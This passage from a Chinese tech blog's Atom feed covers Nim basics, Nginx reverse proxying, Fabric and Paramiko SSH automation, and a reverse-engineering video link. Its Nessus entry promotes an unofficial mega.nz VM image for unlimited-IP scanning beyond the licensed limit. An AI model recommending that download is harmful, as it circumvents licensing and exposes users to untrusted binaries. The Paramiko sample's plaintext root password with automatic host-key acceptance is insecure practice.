of就相当于casecase nameof "":    echo "你不可以输入空的哦."of "HeliantHuS":    echo "HeliantHuS is Handsome"else:    echo "我没看懂你输入的是什么"</code></pre><h5 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if-elif-else"></a>if-elif-else</h5><pre class=" language-Nim"><code class="language-Nim">import strformatvar name: string = readLine(stdin)if name == "HeliantHuS":    echo fmt"Hello, {name}"elif name == "exit":    echo "Exit!!!"else:    echo "没有匹配~"</code></pre><p><img src="/images/6/strfmt.jpg" alt></p><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><p>while 没什么好说的, Python有的它也有.</p><pre class=" language-nil"><code class="language-nil">while true:    echo "Hello"</code></pre><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><pre class=" language-Nim"><code class="language-Nim">for i in countup(1, 10):    echo ifor i in 1..10:    echo i</code></pre><p>上面两段代码效果一样, 可以看出来比Python还要简洁.</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h5><pre class=" language-Nim"><code class="language-Nim">import strformatproc hello(name: string): string =    return fmt"Hello, {name}"</code></pre><h5 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h5><pre class=" language-Nim"><code class="language-Nim">var result = hello("HeliantHuS")echo result</code></pre><h5 id="舍弃函数返回值"><a href="#舍弃函数返回值" class="headerlink" title="舍弃函数返回值"></a>舍弃函数返回值</h5><pre class=" language-Nim"><code class="language-Nim">discard hello("HeliantHuS")</code></pre><p>在Nim中, 函数必须要有返回值, 你就必须要去用变量去接收或者直接echo, 不然会报错, 有时候函数的返回值也许不重要, 就需要去舍弃, 就要用关键字<code>discard</code>去舍弃.</p><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><h5 id="block"><a href="#block" class="headerlink" title="block"></a>block</h5><pre class=" language-Nim"><code class="language-Nim">block hello:    echo "HelloWorld"</code></pre><p>Nim中也是使用缩进进行作用域的区分.</p><blockquote><p>道理我都懂, 可我好像真的对你着迷.</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Nim是一种静态类型编译的系统编程语言, 它结合了其他成熟语言的成功概念, 这次就带你5分钟学会Nim的编写, 来跟我一起尝试一下吧.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Nim" scheme="https://helianthus.top/categories/Nim/"/>
    
    
      <category term="Nim" scheme="https://helianthus.top/tags/Nim/"/>
    
      <category term="元编程" scheme="https://helianthus.top/tags/%E5%85%83%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Nginx反向代理骚操作详解</title>
    <link href="https://helianthus.top/2019/10/03/5-Nginx-Config-ServerName/"/>
    <id>https://helianthus.top/2019/10/03/5-Nginx-Config-ServerName/</id>
    <published>2019-10-02T22:37:31.000Z</published>
    <updated>2020-05-27T23:35:56.744Z</updated>
    
    <content type="html"><![CDATA[<p>Nginx是一个的静态文件和反向代理服务，轻量，方便部署，而且性能极高.<br>看完这篇文章, 你将点亮NGINX配置<code>虚拟主机</code>, <code>反向代理</code>等技能点.</p><a id="more"></a><h2 id="深入浅出"><a href="#深入浅出" class="headerlink" title="深入浅出"></a>深入浅出</h2><pre class=" language-js"><code class="language-js">worker_processes  <span class="token number">1</span><span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections  <span class="token number">1024</span><span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    include       mime<span class="token punctuation">.</span>types<span class="token punctuation">;</span>    default_type  application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    sendfile        on<span class="token punctuation">;</span>    keepalive_timeout  <span class="token number">65</span><span class="token punctuation">;</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">80</span><span class="token punctuation">;</span>        server_name  localhost<span class="token punctuation">;</span>        location <span class="token operator">/</span> <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>            index  index<span class="token punctuation">.</span>html index<span class="token punctuation">.</span>htm<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>上面这是一个<code>nginx</code>最基本的配置, 分<code>http</code>代码块, <code>server</code>代码块, 其中今天要玩的就是<code>server</code>这个代码块.</p><h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><p>首先在<code>nginx</code>的静态文件夹保证有两个<code>html文件</code>, 分别为<code>index.html</code>、<code>page1.html</code>, 里面的内容自己随便写, 只要能分清楚是哪个文件就好.</p><h4 id="正常启动"><a href="#正常启动" class="headerlink" title="正常启动"></a>正常启动</h4><p>正常启动Nginx, 访问通过服务器地址访问, 会访问到<code>index.html</code>的内容.<br><img src="/images/5/indexpage.jpg" alt></p><h4 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h4><p>第一个server代码块不需要更改, 下面紧接着添加:</p><pre class=" language-conf"><code class="language-conf">    server {        listen 80;        server_name page1.com;        location / {            root html;            index page1.html;        }    }</code></pre><p>这样, 只要访问这个服务器的时候，请求头的<code>Host</code>键内容为<code>page1.com</code>, 可以通过抓包或者修改<code>hosts</code>文件的方式来达到目的.<br><img src="/images/5/page1.jpg" alt></p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>第二个server代码块不需要更改, 修改第一个server代码块的内容为:</p><pre class=" language-conf"><code class="language-conf">    server {        listen 80;        server_name localhost;        location / {            proxy_pass http://hls.easy.echosite.cn/;        }    }</code></pre><p>重启服务器, 访问<code>localhost</code>或者服务器真实IP, 你会发现, 显示的结果是你输入的<code>http://hls.easy.echosite.cn</code>的内容, 但是浏览器的URL依旧是<code>localhost</code>或服务器IP.<br><img src="/images/5/proxy.jpg" alt></p><h4 id="防盗链配置"><a href="#防盗链配置" class="headerlink" title="防盗链配置"></a>防盗链配置</h4><p>原理: 通过nginx的if判断, 只允许通过合法的域名访问本网站, 其余的域名访问本网站的时候直接返回403。</p><pre class=" language-conf"><code class="language-conf">server {    listen 80;    server_name youdoamin.com;    if ($host !~* ^youdomain.com$)    {        return 403;    }    location / {        root html;        index index.html index.htm;    }}</code></pre><p>临了, 最后的配置文件样子:<br><img src="/images/5/conf.jpg" alt></p><p>其实Nginx还有很多脚本类的东西, 太过深入就需要自己去研究了, NGINX一般还是作为接入层的反向代理去使用, 配置方便, 也轻量, 真的是做WEB必备的反向代理服务.</p><p>最后~ 文章中演示的<code>hls.easy.echosite.cn</code>是使用<a href="https://www.echosite.cn" target="_blank" rel="noopener">EchoSite2.0 内网穿透，就选他了！</a>所内网穿透用来测试的, 如果有需要内网穿透的可以了解一下.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Nginx是一个的静态文件和反向代理服务，轻量，方便部署，而且性能极高.&lt;br&gt;看完这篇文章, 你将点亮NGINX配置&lt;code&gt;虚拟主机&lt;/code&gt;, &lt;code&gt;反向代理&lt;/code&gt;等技能点.&lt;/p&gt;
    
    </summary>
    
    
      <category term="运维" scheme="https://helianthus.top/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="Nginx" scheme="https://helianthus.top/tags/Nginx/"/>
    
      <category term="HTTP" scheme="https://helianthus.top/tags/HTTP/"/>
    
      <category term="Proxy" scheme="https://helianthus.top/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>Fabric Python远程部署利器</title>
    <link href="https://helianthus.top/2019/10/01/4-Fabric-Python-Remote-deploy/"/>
    <id>https://helianthus.top/2019/10/01/4-Fabric-Python-Remote-deploy/</id>
    <published>2019-09-30T18:00:51.000Z</published>
    <updated>2020-05-27T23:33:38.415Z</updated>
    
    <content type="html"><![CDATA[<p>Fabric是一个Python的第三方库，可以进行Linux的远程部署，批量执行各种命令，况且，机器出错的次数比你少多了呢。<br>(附详细的SSH免密登录过程)</p><a id="more"></a><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><ul><li>Windows10的WSL IP: <code>192.168.1.66</code> 下面简称<code>物理机</code>.</li><li>VMware Centos服务器 IP: <code>192.168.1.40</code> 下面简称<code>服务器</code>.</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>Python3</li><li>类Linux操作系统 | 没有Linux用Windows的WSL也可以.</li></ul><h2 id="技术难点"><a href="#技术难点" class="headerlink" title="技术难点"></a>技术难点</h2><ul><li>SSH免密登录.</li></ul><h2 id="深入浅出"><a href="#深入浅出" class="headerlink" title="深入浅出"></a>深入浅出</h2><h4 id="SSH免密"><a href="#SSH免密" class="headerlink" title="SSH免密"></a>SSH免密</h4><p>使用<code>ssh-keygen</code>命令在物理机生成公钥和私钥, 生成完毕后在当前登录的用户目录下<code>.ssh</code>文件夹下.<br><img src="/images/4/ssh-keygen.jpg" alt></p><p>在服务器中的<code>.ssh</code>文件夹下创建一个名为<code>authorized_keys</code>文件并设置权限为<code>600</code>.</p><pre class=" language-shell"><code class="language-shell">cd ~/.sshtouch authorized_keyschmod 600 authorized_keys</code></pre><p>将物理机的<code>id_rsa.pub</code>里面的内容复制进服务器新建的<code>authorized_keys</code>中.<br>可以使用<code>scp</code>命令，将<code>id_rsa.pub</code>文件发送到服务器中，然后使用<code>cat</code>命令将<code>id_rsa.pub</code>的内容追加到<code>authorized_keys</code>文件中.<br>物理机:</p><pre class=" language-shell"><code class="language-shell">scp ~/.ssh/id_rsa.pub root@192.168.1.40:~/.ssh/</code></pre><p>服务器:</p><pre><code>cat id_rsa.pub &gt;&gt; authorized_keys</code></pre><p><img src="/images/4/scp.jpg" alt><br><img src="/images/4/cat.jpg" alt></p><p>使用物理机远程SSH连接服务器验证是否免密成功<br><img src="/images/4/ssh.jpg" alt></p><h4 id="安装Fabric"><a href="#安装Fabric" class="headerlink" title="安装Fabric"></a>安装Fabric</h4><p>在物理机执行下面的安装命令即可安装完毕.</p><pre class=" language-shell"><code class="language-shell">python3 -m pip install fabric</code></pre><p>找一个空的目录新建名为<code>fabfile.py</code>的文件.<br><img src="/images/4/touch.jpg" alt></p><h4 id="编写Fabric脚本"><a href="#编写Fabric脚本" class="headerlink" title="编写Fabric脚本"></a>编写Fabric脚本</h4><p>使用<code>vim</code>编辑刚刚新建的py文件.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> fabric <span class="token keyword">import</span> Connection<span class="token punctuation">,</span> task@task<span class="token keyword">def</span> <span class="token function">devploy</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Connection<span class="token punctuation">(</span><span class="token string">"root@192.168.1.40"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">:</span>        c<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"ifconfig"</span><span class="token punctuation">)</span></code></pre><p>写入完毕后保存，运行<code>fab deploy</code>即可看到服务器的执行回显.<br><img src="/images/4/fab.jpg" alt></p><p>可以用来一键替换更新yum源, 代码如下:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> fabric <span class="token keyword">import</span> Connection<span class="token punctuation">,</span> task@task<span class="token keyword">def</span> <span class="token function">deploy</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Connection<span class="token punctuation">(</span><span class="token string">"root@192.168.1.40"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">:</span>        c<span class="token punctuation">.</span>run<span class="token punctuation">(</span>'cd <span class="token operator">/</span>etc<span class="token operator">/</span>yum<span class="token punctuation">.</span>repos<span class="token punctuation">.</span>d<span class="token operator">/</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            mv CentOS<span class="token operator">-</span>Media<span class="token punctuation">.</span>repo CentOS<span class="token operator">-</span>Media<span class="token punctuation">.</span>repo<span class="token punctuation">.</span>backup <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            wget http<span class="token punctuation">:</span><span class="token operator">//</span>mirrors<span class="token number">.163</span><span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token punctuation">.</span>help<span class="token operator">/</span>CentOS7<span class="token operator">-</span>Base<span class="token number">-163.</span>repo <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            yum clean all <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            yum makecache <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            yum update'<span class="token punctuation">)</span></code></pre><p><img src="/images/4/yum.jpg" alt></p><p>不是不愿意学习新的东西, 而是想知道学习这个能做什么, 加油.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Fabric是一个Python的第三方库，可以进行Linux的远程部署，批量执行各种命令，况且，机器出错的次数比你少多了呢。&lt;br&gt;(附详细的SSH免密登录过程)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://helianthus.top/categories/Python/"/>
    
    
      <category term="Python" scheme="https://helianthus.top/tags/Python/"/>
    
      <category term="fabric" scheme="https://helianthus.top/tags/fabric/"/>
    
      <category term="远程部署" scheme="https://helianthus.top/tags/%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Nessus系统漏洞扫描平台(VMware傻瓜式安装)</title>
    <link href="https://helianthus.top/2019/09/30/3-Nessus-Install-or-Use-and-License/"/>
    <id>https://helianthus.top/2019/09/30/3-Nessus-Install-or-Use-and-License/</id>
    <published>2019-09-29T21:44:44.000Z</published>
    <updated>2020-05-27T23:32:38.062Z</updated>
    
    <content type="html"><![CDATA[<p>最懊恼的就是安装这种软件了，免费版本只能扫描16个IP，收费版本在天朝没人会去买，买完也没人去分享，而现在，我来安利一波可以无限IP，而且还傻瓜式的Nessus安装方式.</p><a id="more"></a><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ol><li>VMware Workstation (Version &gt;= 12)</li><li>科学上网工具</li><li>眼睛和脑子</li></ol><h2 id="下载Nessus-VMware版"><a href="#下载Nessus-VMware版" class="headerlink" title="下载Nessus(VMware版)"></a>下载Nessus(VMware版)</h2><p><a href="https://mega.nz/#!0YkSDYpY!JndpKpH5yB3hDNV-091jOwPhW9rLK9iNSzuF9nTz-i0" target="_blank" rel="noopener">https://mega.nz/#!0YkSDYpY!JndpKpH5yB3hDNV-091jOwPhW9rLK9iNSzuF9nTz-i0</a></p><h2 id="部署Nessus"><a href="#部署Nessus" class="headerlink" title="部署Nessus"></a>部署Nessus</h2><h4 id="导入至VMware"><a href="#导入至VMware" class="headerlink" title="导入至VMware"></a>导入至VMware</h4><p>首先解压下载的压缩文件，放到你能记得住的地方</p><p>然后打开<code>vmware</code>, <code>File -&gt; Open</code>, 选择<code>Nessus 8_VM12.ovf</code>文件.</p><p><img src="/images/3/vmware1.jpg" alt><br><img src="/images/3/vmware2.jpg" alt></p><h4 id="开机运行-配置网卡"><a href="#开机运行-配置网卡" class="headerlink" title="开机运行 配置网卡"></a>开机运行 配置网卡</h4><p>默认的用户名和密码都在描述中写了, 按照描述进行操作绝对没问题的.<br><img src="/images/3/description.jpg" alt></p><p>开机你肯定没问题了，按照他的要求访问<code>https://1.1.2.1:8834</code>你肯定访问不了，你需要修改网卡配置</p><p>这样，将网卡2改成NAT<br><img src="/images/3/setting.jpg" alt></p><p>就可以自动获取IP地址, 获取完毕直接输入<code>ifconfig</code>查看自动获取的IP地址, 访问自动获取的IP地址加端口号…哦对了, 一定要是<code>https</code>, 比如我自动获取的IP地址为<code>192.168.23.134</code>, 那么我在我物理机访问<code>https://192.168.23.134:8834</code>就可以了.<br><img src="/images/3/nessus.jpg" alt></p><p>到这里就完全可以正常运行以及进行扫描了, 怎么运行扫描就要看你了, 赶紧继续学习吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最懊恼的就是安装这种软件了，免费版本只能扫描16个IP，收费版本在天朝没人会去买，买完也没人去分享，而现在，我来安利一波可以无限IP，而且还傻瓜式的Nessus安装方式.&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络安全" scheme="https://helianthus.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://helianthus.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="扫描" scheme="https://helianthus.top/tags/%E6%89%AB%E6%8F%8F/"/>
    
      <category term="漏洞" scheme="https://helianthus.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Paramiko Python远程连接工具</title>
    <link href="https://helianthus.top/2019/09/29/2-paramiko-remote-exec/"/>
    <id>https://helianthus.top/2019/09/29/2-paramiko-remote-exec/</id>
    <published>2019-09-28T22:38:02.000Z</published>
    <updated>2020-05-27T23:35:06.425Z</updated>
    
    <content type="html"><![CDATA[<p>Paramiko是一个Python的远程操作库，可以进行<code>SSH</code>, <code>SFTP</code>等远程连接操作. 来学习学习怎么使用吧</p><a id="more"></a><h1 id="安装Paramiko"><a href="#安装Paramiko" class="headerlink" title="安装Paramiko"></a>安装Paramiko</h1><pre class=" language-shell"><code class="language-shell">    python3 -m pip install paramiko</code></pre><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><h3 id="导入paramiko"><a href="#导入paramiko" class="headerlink" title="导入paramiko"></a>导入paramiko</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> paramiko</code></pre><h3 id="初始化SSHClient"><a href="#初始化SSHClient" class="headerlink" title="初始化SSHClient"></a>初始化SSHClient</h3><pre class=" language-python"><code class="language-python">client <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="连接主机"><a href="#连接主机" class="headerlink" title="连接主机"></a>连接主机</h3><p>我的<code>Linux</code>主机是<code>192.168.1.40</code>，用户名为<code>root</code>, 密码为<code>admin123.</code></p><pre class=" language-python"><code class="language-python">client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>hostname<span class="token operator">=</span><span class="token string">"192.168.1.40"</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"admin123."</span><span class="token punctuation">)</span></code></pre><p><img src="/images/2/warning.jpg" alt="warning"><br>连接上会有几条警告，可以无视掉，或者直接<a href="https://github.com/paramiko/paramiko/issues/1386#issuecomment-470847772" target="_blank" rel="noopener">屏蔽警告信息</a></p><h3 id="发送命令"><a href="#发送命令" class="headerlink" title="发送命令"></a>发送命令</h3><p>执行一个<code>ifconfig</code>命令</p><pre class=" language-python"><code class="language-python">stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> client<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">"ifconfig"</span><span class="token punctuation">)</span></code></pre><p>注意这里, <code>exec_command</code>的返回值为tuple类型<br>可以通过<code>python3 -m pydoc paramiko.SSHClient.exec_command</code>查看源码.<br><img src="/images/2/pydoc.jpg" alt="PyDoc"></p><h3 id="查看命令返回值"><a href="#查看命令返回值" class="headerlink" title="查看命令返回值"></a>查看命令返回值</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p><img src="/images/2/ifconfig.jpg" alt="ifconfig"><br>这样就得到了返回值</p><h3 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h3><p>不要总是依赖上下文, 要学会手动释放资源关闭连接</p><pre class=" language-python"><code class="language-python">client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>到这里, <code>paramiko</code>的<code>SSHClient</code>用法就结束了，<code>paramiko</code>还支持<code>SFTPClient</code>等其他远程操作, 自己发掘吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Paramiko是一个Python的远程操作库，可以进行&lt;code&gt;SSH&lt;/code&gt;, &lt;code&gt;SFTP&lt;/code&gt;等远程连接操作. 来学习学习怎么使用吧&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://helianthus.top/categories/Python/"/>
    
    
      <category term="paramiko" scheme="https://helianthus.top/tags/paramiko/"/>
    
      <category term="python" scheme="https://helianthus.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Simple Reverse (简单的逆向)</title>
    <link href="https://helianthus.top/2019/09/28/1-Simple-Reverse/"/>
    <id>https://helianthus.top/2019/09/28/1-Simple-Reverse/</id>
    <published>2019-09-28T12:51:00.000Z</published>
    <updated>2020-05-27T23:41:20.925Z</updated>
    
    <content type="html"><![CDATA[<p>学习使用IDA Pro 和 x64dbg反编译一个C语言程序.</p><a id="more"></a><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ol start="0"><li>DevC++</li><li>IDA Pro</li><li>x64dbg</li></ol><h2 id="开始动手！"><a href="#开始动手！" class="headerlink" title="开始动手！"></a>开始动手！</h2><p>我直接做成了视频. 直接来看吧.<br><a href="https://www.bilibili.com/video/av69174106" target="_blank" rel="noopener">【逆向工程】IDA Pro + x64dgb反编译一个应用程序</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习使用IDA Pro 和 x64dbg反编译一个C语言程序.&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="reverse" scheme="https://helianthus.top/tags/reverse/"/>
    
  </entry>
  
</feed>
